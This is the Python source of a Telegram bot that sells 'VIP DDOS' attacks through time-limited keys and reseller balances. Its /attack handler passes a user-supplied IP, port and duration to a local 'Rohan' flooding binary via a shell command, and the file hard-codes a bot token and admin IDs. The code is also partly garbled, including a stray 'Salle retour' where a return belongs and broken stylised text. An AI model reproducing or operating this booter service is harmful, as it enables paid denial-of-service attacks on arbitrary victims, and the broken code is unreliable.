import os
import json
import time
import random
import string
import telebot
import datetime
import subprocess
import threading
import psutil
import pytz
from telebot import types
from dateutil.relativedelta import relativedelta
from filelock import FileLock

# Bot setup
bot = telebot.TeleBot('7808978161:AAG0aidajxaCci9wSVqX6yTIqMBg9vVJIis', parse_mode='Markdown', threaded=True)
admin_id = {"6258297180", "1807014348"}
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USER_FILE = os.path.join(BASE_DIR, "users.json")
LOG_FILE = os.path.join(BASE_DIR, "log.txt")
KEY_FILE = os.path.join(BASE_DIR, "keys.json")
RESELLERS_FILE = os.path.join(BASE_DIR, "resellers.json")
LAST_ATTACK_FILE = os.path.join(BASE_DIR, "last_attack.json")
KEY_COST = {"1hour": 10, "1day": 100, "7days": 450, "1month": 900}
COOLDOWN_PERIOD = 60

# In-memory storage
users, keys, last_attack_time, resellers = {}, {}, {}, {}

def load_data():
    global users, keys, last_attack_time, resellers
    users = read_json(USER_FILE, {})
    keys = read_json(KEY_FILE, {})
    last_attack_time = {k: datetime.datetime.fromisoformat(v).replace(tzinfo=pytz.UTC) for k, v in read_json(LAST_ATTACK_FILE, {}).items()}
    resellers = read_json(RESELLERS_FILE, {})

def read_json(file_path, default):
    try:
        with FileLock(file_path + ".lock"):
            with open(file_path, "r") as f:
                return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError, PermissionError):
        return default

def save_json(file_path, data):
    with FileLock(file_path + ".lock"):
        with open(file_path, "w") as f:
            json.dump(data, f)

def escape_markdown(text):
    if not text:
        return "No username"
    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

def send_response(message, text, markup=None):
    try:
        bot.reply_to(message, text, reply_markup=markup, parse_mode='Markdown')
    except telebot.apihelper.ApiTelegramException as e:
        print(f"Failed to send message: {e}\nResponse: {text}")
        bot.reply_to(message, "Error: Unable to send message due to formatting issues.", parse_mode=None)

def restrict_to_admin(user_id, message):
    if user_id not in admin_id:
        send_response(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 �_D𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return False
    return True

def restrict_to_authorized(user_id, message):
    if user_id not in users:
        owner = escape_markdown("@Rohan2349")
        send_response(message, f"[X] 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! [X]\n𝗢𝗪𝗡𝗘𝗥: {owner}")
        return False
    return True

def create_random_key(length=10):
    chars = string.ascii_uppercase + string.digits
    return f"Rahul-{''.join(random.choices(chars, k=length))}"

def add_time_to_current_date(**kwargs):
    return datetime.datetime.now(pytz.UTC) + relativedelta(**kwargs)

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username or f"UserID: {user_id}"
    with open(LOG_FILE, "a") as f:
        f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log = f"UserID: {user_id} | Time: {datetime.datetime.now(pytz.UTC)} | Command: {command}"
    if target:
        log += f" | Target: {target}"
    if port:
        log += f" | Port: {port}"
    if time:
        log += f" | Time: {time}"
    with open(LOG_FILE, "a") as f:
        f.write(log + "\n")

@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add("🚀 Attack", "👤 My Info", "🎟️ Redeem Key")
    send_response(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦!", markup)

@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 3:
        send_response(message, "�_U𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱_𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗯𝗮𝗹𝗮𝗻𝗰𝗲>")
        return
    reseller_id, balance = cmd[1], int(cmd[2])
    if reseller_id in resellers:
        send_response(message, f"❗️𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗲𝘅𝗶𝘀𝘁𝘀")
        return
    resellers[reseller_id] = balance
    save_json(RESELLERS_FILE, resellers)
    send_response(message, f"✅ 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗮𝗱𝗱𝗲𝗱 ✅\n𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗: {reseller_id}\n𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance} Rs")

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)
    cmd = message.text.split()
    if len(cmd) != 2:
        send_response(message, "�_U𝘀𝗮𝗴𝗲: /𝗴𝗲𝗻_𝗸𝗲𝘆 <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
        return
    duration = cmd[1].lower()
    if duration not in KEY_COST:
        send_response(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻")
        return
    cost = KEY_COST[duration]
    key = create_random_key()
    keys[key] = {"duration": duration, "expiration_time": None}
    save_json(KEY_FILE, keys)
    if user_id in admin_id:
        send_response(message, f"✅ *Key generated successfully* ✅\n𝗞𝗲𝘆: `{key}`\n𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration}")
    elif user_id in resellers:
        if resellers[user_id] < cost:
            send_response(message, f"❗️𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗰𝗲\n𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱: {cost} Rs\n𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲: {resellers[user_id]} Rs")
            return
        resellers[user_id] -= cost
        save_json(RESELLERS_FILE, resellers)
        send_response(message, f"✅ *Key generated successfully* ✅\n𝗞𝗲𝘆: `{key}`\n𝗗𝘂𝗿�_a𝘁𝗶𝗼𝗻: {duration}\n𝗖𝗼𝘀𝘁: {cost} Rs\n𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[user_id]} Rs")
    else:
        send_response(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻/𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗻𝗹𝘆")

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    if not restrict_to_admin(user_id, message):
        return
    help_text = """
💎 *ULTRA PRO MAX ADMIN PANEL* 💎
━━━━━━━━━━━━━━━━━━━━━━━
🔥 *BOT CONTROLS:* 🔥
🚀 `/start` - *Ignite the bot!*
📖 `/help` - *View this guide!*
⚔️ `/attack <ip> <port> <time>` - *Launch attack (max 300s)!*

⚡ *POWER MANAGEMENT:* ⚡
🏦 `/add_reseller <user_id> <balance>` - *Add reseller!*
🔑 `/genkey <duration>` - *Generate key!*
📜 `/logs` - *View logs!*
👥 `/users` - *List users!*
❌ `/remove <user_id>` - *Remove user!*
🏅 `/resellers` - *List resellers!*
💰 `/addbalance <reseller_id> <amount>` - *Add balance!*
🗑️ `/remove_reseller <reseller_id>` - *Remove reseller!*
"""
    send_response(message, help_text)

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in resellers:
        send_response(message, f"💰 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[user_id]} Rs")
    else:
        send_response(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗻𝗹𝘆")

@bot.message_handler(func=lambda m: m.text == "🎟️ Redeem Key")
def redeem_key_prompt(message):
    send_response(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip()
    if key not in keys:
        send_response(message, "📛 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗼𝗿 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗸𝗲𝘆 📛")
        return
    if user_id in users:
        if datetime.datetime.now(pytz.UTC) < datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S').replace(tzinfo=pytz.UTC):
            send_response(message, "❕𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀❕")
            return
        del users[user_id]
    duration = keys[key]["duration"]
    expiration = add_time_to_current_date(
        hours=1 if duration == "1hour" else 0,
        days=1 if duration == "1day" else 7 if duration == "7days" else 0,
        months=1 if duration == "1month" else 0
    )
    users[user_id] = expiration.strftime('%Y-%m-%d %H:%M:%S')
    save_json(USER_FILE, users)
    del keys[key]
    save_json(KEY_FILE, keys)
    send_response(message, f"✅ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱!\n𝗘𝘅𝗽𝗶�_r𝗲𝘀 𝗼𝗻: {users[user_id]}")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if not restrict_to_admin(user_id, message):
       Salle retour
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as f:
                bot.send_document(message.chat.id, f)
        except FileNotFoundError:
            send_response(message, "No data found")
    else:
        send_response(message, "No data found")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = str(message.chat.id)
    if not restrict_to_authorized(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 4:
        send_response(message, "�_U𝘀𝗮𝗴𝗲: /𝗮𝘁𝘁𝗮𝗰𝗸 <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝘁𝗶𝗺𝗲>")
        return
    process_attack_details(message, cmd[1:])

@bot.message_handler(func=lambda m: m.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)
    if not restrict_to_authorized(user_id, message):
        return
    expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S').replace(tzinfo=pytz.UTC)
    if datetime.datetime.now(pytz.UTC) > expiration:
        send_response(message, "❗️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻 ❗️")
        return
    if user_id in last_attack_time:
        if (datetime.datetime.now(pytz.UTC) - last_attack_time[user_id]).total_seconds() < COOLDOWN_PERIOD:
            remaining = COOLDOWN_PERIOD - (datetime.datetime.now(pytz.UTC) - last_attack_time[user_id]).total_seconds()
            send_response(message, f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 𝗪𝗮𝗶𝘁 𝗔𝗰𝗰𝗲𝘀𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻 ❗️")
            return
    send_response(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁, 𝘁𝗶𝗺𝗲 (𝘀𝗲𝗰𝗼𝗻𝗱𝘀) 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲")
    bot.register_next_step_handler(message, process_attack_details)

def process_attack_details(message, details=None):
    user_id = str(message.chat.id)
    details = details or message.text.split()
    if len(details) != 3:
        send_response(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: 𝘁𝗮𝗿𝗴𝗲𝘁 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲")
        return
    target, port, time = details
    try:
        port = int(port)
        time = int(time)
        if not 1 <= port <= 65535:
            raise ValueError
        if time > 300:
            send_response(message, "𝗘𝗿𝗿𝗼𝗿: 𝗧𝗶𝗺𝗲 𝗺𝘂𝘀𝘁 𝗯𝗲 ≤ 300 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
            return
    except ValueError:
        send_response(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁")
        return
    if psutil.cpu_percent() > 80 or psutil.virtual_memory().percent > 80:
        send_response(message, "𝗘𝗿𝗿𝗼𝗿: 𝗦𝘆𝘀𝘁𝗲𝗺 𝗿𝗲𝘀𝗼𝘂�_r𝗰𝗲𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲")
        return
    rohan_binary = os.path.join(BASE_DIR, "Rohan")
    if not os.path.isfile(rohan_binary) or not os.access(rohan_binary, os.X_OK):
        send_response(message, "𝗘𝗿𝗿𝗼𝗿: 𝗥𝗼𝗵𝗮𝗻 𝗯𝗶𝗻𝗮𝗿𝘆 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗼𝗿 𝗻𝗼𝘁 𝗲𝘅𝗲𝗰𝘂𝘁𝗮𝗯𝗹𝗲")
        return
    record_command_logs(user_id, 'attack', target, port, time)
    log_command(user_id, target, port, time)
    full_command = f"./Rohan {target} {port} {time} 65507"
    response = (
        "✅ **ATTACK LAUNCHED** ✅\n"
        "✅ **ATTACK LAUNCHED** ✅\n"
        f"⭐ **Target**: {target}\n"
        f"⭐ **Port**: {port}\n"
        f"⭐ **Time**: {time} seconds\n"
        "https://t.me/+GYbpAGalM1yOOTU1\n\n"
        "📢 Swiftly 24x7Seller trust **SERVER**\n"
        "[VIEW GROUP]"
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("VIEW GROUP", url="https://t.me/+GYbpAGalM1yOOTU1"))
    send_response(message, response, markup)
    subprocess.Popen(full_command, shell=True)
    threading.Timer(time, lambda: bot.send_message(message.chat.id, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱! ✅")).start()
    last_attack_time[user_id] = datetime.datetime.now(pytz.UTC)
    save_json(LAST_ATTACK_FILE, {k: v.isoformat() for k, v in last_attack_time.items()})

@bot.message_handler(func=lambda m: m.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = escape_markdown(message.chat.username or "No username")
    user_id_escaped = escape_markdown(user_id)
    if user_id in admin_id:
        role, expiration, balance = "Admin", "No access", "Not Applicable"
    elif user_id in resellers:
        role, expiration, balance = "Reseller", "No access", str(resellers.get(user_id, 0))
    elif user_id in users:
        role, expiration, balance = "User", users[user_id], "Not Applicable"
    else:
        role, expiration, balance = "Guest", "No active key", "Not Applicable"
    response = (
        f"👤 *USER INFORMATION* 👤\n\n"
        f"ℹ️ *Username*: @{username}\n"
        f"🆔 *UserID*: {user_id_escaped}\n"
        f"🚹 *Role*: {escape_markdown(role)}\n"
        f"🕘 *Expiration*: {escape_markdown(expiration)}\n"
    )
    if role == "Reseller":
        response += f"💰 *Balance*: {escape_markdown(balance)} Rs\n"
    send_response(message, response)

@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)
    if not restrict_to_admin(user_id, message):
        return
    if not users:
        send_response(message, "⚠️ 𝗡𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱")
        return
    response = "✅ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗨𝘀𝗲𝗿𝘀 ✅\n\n"
    for user, expiration in users.items():
        user_info = bot.get_chat(user)
        username = escape_markdown(user_info.username or user_info.first_name or "Unknown")
        response += f"• 𝗨𝘀𝗲𝗿 𝗜𝗗: {escape_markdown(user)}\n  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n  𝗘𝘅𝗽𝗶𝗿𝗲𝘀: {escape_markdown(expiration)}\n\n"
    send_response(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 2:
        send_response(message, "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲 <𝗨𝘀𝗲�_r_𝗜𝗗>")
        return
    target_user_id = cmd[1]
    if target_user_id in users:
        del users[target_user_id]
        save_json(USER_FILE, users)
        send_response(message, f"✅ 𝗨𝘀𝗲𝗿 {escape_markdown(target_user_id)} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱")
    else:
        send_response(message, f"⚠️ 𝗨𝘀𝗲𝗿 {escape_markdown(target_user_id)} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱")

@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    user_id = str(message.chat.id)
    if not restrict_to_admin(user_id, message):
        return
    if not resellers:
        send_response(message, "𝗡𝗼 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀 𝗳𝗼𝘂�_n𝗱")
        return
    response = "✅ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀 ✅\n\n"
    for reseller_id, balance in resellers.items():
        reseller_info = bot.get_chat(reseller_id)
        username = escape_markdown(reseller_info.username or reseller_info.first_name or "Unknown")
        response += f"• �_U𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {username}\n  𝗨𝘀𝗲𝗿𝗜𝗗: {escape_markdown(reseller_id)}\n  𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {escape_markdown(str(balance))} Rs\n\n"
    send_response(message, response)

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 3:
        send_response(message, "𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱_𝗯𝗮𝗹𝗮𝗻𝗰𝗲 <𝗿𝗲𝘀𝗲𝗹𝗹𝗲�_r𝗶𝗱> <𝗮𝗺𝗼𝘂𝗻𝘁>")
        return
    reseller_id, amount = cmd[1], float(cmd[2])
    if reseller_id not in resellers:
        send_response(message, "𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱")
        return
    resellers[reseller_id] += amount
    save_json(RESELLERS_FILE, resellers)
    send_response(message, f"✅ 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝗮𝗱𝗱𝗲𝗱 ✅\n𝗔𝗺𝗼𝘂𝗻𝘁: {amount} Rs\n𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗: {escape_markdown(reseller_id)}\n𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[reseller_id]} Rs")

@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    if not restrict_to_admin(user_id, message):
        return
    cmd = message.text.split()
    if len(cmd) != 2:
        send_response(message, "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲_𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 <𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿_𝗶𝗱>")
        return
    reseller_id = cmd[1]
    if reseller_id not in resellers:
        send_response(message, "𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗜𝗗 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱")
        return
    del resellers[reseller_id]
    save_json(RESELLERS_FILE, resellers)
    send_response(message, f"✅ 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {escape_markdown(reseller_id)} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱")

if __name__ == "__main__":
    load_data()
    import sys
    if sys.version_info < (3, 6):
        sys.exit("Error: Python 3.6+ required")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)